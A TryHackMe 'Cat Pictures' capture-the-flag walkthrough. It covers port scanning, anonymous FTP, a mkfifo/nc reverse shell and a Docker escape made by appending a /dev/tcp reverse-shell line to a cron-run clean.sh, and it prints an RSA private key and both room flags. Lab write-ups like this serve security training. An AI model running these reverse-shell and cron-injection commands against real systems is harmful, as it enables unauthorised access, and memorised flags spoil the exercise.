---
title: "Cat Pictures - TryHackMe Writeup & Walkthrough"
description: "Exploiting FTP and an internal netcat service for a reverse shell, followed by a Docker escape to gain root access in the Cat Pictures room."
permalink: /TryHackMe/EASY/catpictures/
---

# TryHackMe: Cat Pictures

[![Linux Exploitation](https://img.shields.io/badge/Category-Linux%20Exploitation-brightgreen)](#)

## 1. Initial Reconnaissance

First of all we did nmap/rust scan and here are the results

```sh
└─$ nmap -sC -sV -T4 10.48.161.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-28 17:13 IST
Nmap scan report for 10.48.161.2
Host is up (0.11s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.135.240
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp           162 Apr 02  2021 note.txt
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 37:43:64:80:d3:5a:74:62:81:b7:80:6b:1a:23:d8:4a (RSA)
|   256 53:c6:82:ef:d2:77:33:ef:c1:3d:9c:15:13:54:0e:b2 (ECDSA)
|_  256 ba:97:c3:23:d4:f2:cc:08:2c:e1:2b:30:06:18:95:41 (ED25519)
8080/tcp open  http    Apache httpd 2.4.46 ((Unix) OpenSSL/1.1.1d PHP/7.3.27)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.46 (Unix) OpenSSL/1.1.1d PHP/7.3.27
|_http-title: Cat Pictures - Index page
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

## 2. Web Application Enumeration

Now Let's move toward the site there one user has posted something when we click on it we are greeted with a post of magic numbers

```js
user
    Site Admin
    Posts: 1
    Joined: Wed Mar 24, 2021 7:33 pm

Post cat pictures here!

Post by user » Wed Mar 24, 2021 8:33 pm
POST ALL YOUR CAT PICTURES HERE :)

Knock knock! Magic numbers: 1111, 2222, 3333, 4444
```

## 3. Targeted Port Scanning

### Probing the Magic Ports

At first I thought maybe these numbers are some kind of cipher but given their count of digits and numbers I thought they seem to be port number so why not scan them
Let's go and scan them using nmap

```sh
└─$ for i in 1111 2222 3333 4444; do nmap -Pn -p $i --host-timeout 201 --max-retries 0 10.48.161.2; done
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-28 17:10 IST
Nmap scan report for 10.48.161.2
Host is up (0.055s latency).

PORT     STATE  SERVICE
1111/tcp closed lmsocialserver

Nmap done: 1 IP address (1 host up) scanned in 0.29 seconds
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-28 17:10 IST
Nmap scan report for 10.48.161.2
Host is up (0.10s latency).

PORT     STATE  SERVICE
2222/tcp closed EtherNetIP-1

Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-28 17:10 IST
Nmap scan report for 10.48.161.2
Host is up (0.084s latency).

PORT     STATE  SERVICE
3333/tcp closed dec-notes

Nmap done: 1 IP address (1 host up) scanned in 0.20 seconds
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-28 17:10 IST
Nmap scan report for 10.48.161.2
Host is up (0.10s latency).

PORT     STATE  SERVICE
4444/tcp closed krb524

Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
```

So we got these services

```sh
PORT     STATE  SERVICE
1111/tcp closed lmsocialserver
2222/tcp closed EtherNetIP-1
3333/tcp closed dec-notes
4444/tcp closed krb524
```

## 4. FTP Exploitation

### Extracting the note.txt File

okay now I think this was the part for scanning now let's check services
first let's check FTP

```sh
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||49085|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           162 Apr 02  2021 note.txt
226 Directory send OK.
ftp> mget *
mget note.txt [anpqy?]? a
Prompting off for duration of mget.
229 Entering Extended Passive Mode (|||19219|)
150 Opening BINARY mode data connection for note.txt (162 bytes).
100% |********************************************************************************************************************************************************************|   162        1.20 MiB/s    00:00 ETA
226 Transfer complete.
162 bytes received in 00:00 (2.82 KiB/s)
```

We got a file named note.txt which says this

```sh
└─$ cat note.txt
In case I forget my password, I'm leaving a pointer to the internal shell service on the server.

Connect to port 4420, the password is sardinethecat.
- catlover
```

## 5. Gaining a Foothold

### Reverse Shell via Internal Service

Okieee let's go for 4420 now.

From here I checked the installed software under /bin/ and found netcat to be installed. And that means we can use `nc` as a service for reverse shell :)

So we use this one `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.135.240 1337 >/tmp/f`
And Yeah
we got the shell...

```sh
└─$ nc -nvlp 1337
listening on [any] 1337 ...
connect to [192.168.135.240] from (UNKNOWN) [10.48.161.2] 37280
bash: cannot set terminal process group (1868): Inappropriate ioctl for device
bash: no job control in this shell
sardinethecat
I have no name!@cat-pictures:/#
```

## 6. Privilege Escalation

Here there was one user in `/home` --> `catlover`
the user has only one file named `runme`
so we ran it and it asks for a password which is not the one we used earlier so I `cat` it to see if I can find anything useful and yeah this is what I found

```plain
 %(tOHHHEHRHHHHEHHEHHH(H]UHH}u}u2}u)H=-EH6+H5-H+HUH]UHH H}HuHUH}uHUHMHEHHUHATSHH}HuHEHHHEHH9uCHEHIHEHJHHEH;LHHQuH[A\]@AWL=+'AVIAUIATAUH$'SL)Ht1LLDAHH9u[]A\A]A^A_ff.rebeccaPlease enter yout password: Welcome, catlover! SSH key transfer queued! touch /tmp/gibmethesshkeyAccess Deniedd
```

So we see a name `rebecca` and SSH Key transfer queued! so let's try the pass `rebecca`

And after some time we get the `id_rsa` in the same directory

```sh
I have no name!@cat-pictures:/home/catlover# ls
ls
id_rsa
runme
I have no name!@cat-pictures:/home/catlover#
```

Yup! got the `ssh` key 😁

```ssh
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAmI1dCzfMF4y+TG3QcyaN3B7pLVMzPqQ1fSQ2J9jKzYxWArW5
IWnCNvY8gOZdOSWgDODCj8mOssL7SIIgkOuD1OzM0cMBSCCwYlaN9F8zmz6UJX+k
jSmQqh7eqtXuAvOkadRoFlyog2kZ1Gb72zebR75UCBzCKv1zODRx2zLgFyGu0k2u
xCa4zmBdm80X0gKbk5MTgM4/l8U3DFZgSg45v+2uM3aoqbhSNu/nXRNFyR/Wb10H
tzeTEJeqIrjbAwcOZzPhISo6fuUVNH0pLQOf/9B1ojI3/jhJ+zE6MB0m77iE07cr
lT5PuxlcjbItlEF9tjqudycnFRlGAKG6uU8/8wIDAQABAoIBAH1NyDo5p6tEUN8o
aErdRTKkNTWknHf8m27h+pW6TcKOXeu15o3ad8t7cHEUR0h0bkWFrGo8zbhpzcte
D2/Z85xGsWouufPL3fW4ULuEIziGK1utv7SvioMh/hXmyKymActny+NqUoQ2JSBB
QuhqgWJppE5RiO+U5ToqYccBv+1e2bO9P+agWe+3hpjWtiAUHEdorlJK9D+zpw8s
/+9CjpDzjXA45X2ikZ1AhWNLhPBnH3CpIgug8WIxY9fMbmU8BInA8M4LUvQq5A63
zvWWtuh5bTkj622QQc0Eq1bJ0bfUkQRD33sqRVUUBE9r+YvKxHAOrhkZHsvwWhK/
oylx3WECgYEAyFR+lUqnQs9BwrpS/A0SjbTToOPiCICzdjW9XPOxKy/+8Pvn7gLv
00j5NVv6c0zmHJRCG+wELOVSfRYv7z88V+mJ302Bhf6uuPd9Xu96d8Kr3+iMGoqp
tK7/3m4FjoiNCpZbQw9VHcZvkq1ET6qdzU+1I894YLVu258KeCVUqIMCgYEAwvHy
QTo6VdMOdoINzdcCCcrFCDcswYXxQ5SpI4qMpHniizoa3oQRHO5miPlAKNytw5PQ
zSKoIW47AObP2twzVAH7d+PWRzqAGZXW8gsF6Ls48LxSJGzz8V191PjbcGQO7Oro
Em8pQ+qCISxv3A8fKvG5E9xOspD0/3lsM/zGD9ECgYBOTgDAuFKS4dKRnCUt0qpK
68DBJfJHYo9DiJQBTlwVRoh/h+fLeChoTSDkQ5StFwTnbOg+Y83qAqVwsYiBGxWq
Q2YZ/ADB8KA5OrwtrKwRPe3S8uI4ybS2JKVtO1I+uY9v8P+xQcACiHs6OTH3dfiC
tUJXwhQKsUCo5gzAk874owKBgC/xvTjZjztIWwg+WBLFzFSIMAkjOLinrnyGdUqu
aoSRDWxcb/tF08efwkvxsRvbmki9c97fpSYDrDM+kOQsv9rrWeNUf4CpHJQuS9zf
ZSal1Q0v46vdt+kmqynTwnRTx2/xHf5apHV1mWd7PE+M0IeJR5Fg32H/UKH8ROZM
RpHhAoGAehljGmhge+i0EPtcok8zJe+qpcV2SkLRi7kJZ2LaR97QAmCCsH5SndzR
tDjVbkh5BX0cYtxDnfAF3ErDU15jP8+27pEO5xQNYExxf1y7kxB6Mh9JYJlq0aDt
O4fvFElowV6MXVEMY/04fdnSWavh0D+IkyGRcY5myFHyhWvmFcQ=
-----END RSA PRIVATE KEY-----
```

We save the rsa file and change its permission to 600

## 7. Container Access

### Entering the Environment and Finding Flag 1

And yeah we are in as root

```sh
└─$ ssh -i id_rsa catlover@10.48.161.2
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Dec 28 04:11:43 PST 2025

  System load:  0.08               Users logged in:                0
  Usage of /:   37.4% of 19.56GB   IP address for eth0:            10.48.161.2
  Memory usage: 39%                IP address for br-98674f8f20f9: 172.18.0.1
  Swap usage:   0%                 IP address for docker0:         172.17.0.1
  Processes:    114


52 updates can be applied immediately.
25 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


Last login: Fri Jun  4 14:40:35 2021
root@7546fa2336d6:/# whoami
root
root@7546fa2336d6:/#
```

Flag1: flag.txt

```sh
root@7546fa2336d6:/root# cat flag.txt
7cf90a0e7c5d25f1a827d3efe6fe4d0edd63cca9
```

## 8. Docker Escape

### Identifying the Container Environment

<h3> Okay Guys being a root was a big false positive :`( we are not root we are in a docker container :)</h3>
You can see there is a docker file

```sh
-rw-------   1 root root  588 Jun  4  2021 .bash_history
-rwxr-xr-x   1 root root    0 Mar 25  2021 .dockerenv
```

## 9. Host Level Exploitation

### Injecting Malicious Code into clean.sh

There is this file which is removing everything from /tmp

```sh
root@7546fa2336d6:/opt/clean# cat clean.sh
#!/bin/bash

rm -rf /tmp/*
```

So we can use this for our own use and reversh shell to get into the original machine

I placed this in the file

```sh
echo '0<&196;exec 196<>/dev/tcp/<YOUR_IP>/4422; sh <&196 >&196 2>&196' >> clean.sh
```

## 10. Final System Compromise

### Achieving Host Root and Flag 2

Okay now we wail till we get the shell
...
..
.

```sh
└─$ nc -nvlp 4422
listening on [any] 4422 ...
connect to [192.168.135.240] from (UNKNOWN) [10.48.161.2] 40826
which python3
/usr/bin/python3
root@cat-pictures:~# export TERM=xterm-256color
export TERM=xterm-256color
root@cat-pictures:~#
```

Ahhh! so happy to see our beloved `python3` in here we got into the shell (interactive) now let's get the flag

```sh
root@cat-pictures:~# ls
firewall  root.txt
root@cat-pictures:~# cat root.txt
Congrats!!!

Here is your flag:

4a98e43d78bab283938a06f38d2ca3a3c53f0476
root@cat-pictures:~#
```

## 11. Final Capture Summary

### Collected Flags

Thus we got both the flags as

```sh
Flag1: 7cf90a0e7c5d25f1a827d3efe6fe4d0edd63cca9
Flag2: 4a98e43d78bab283938a06f38d2ca3a3c53f0476
```
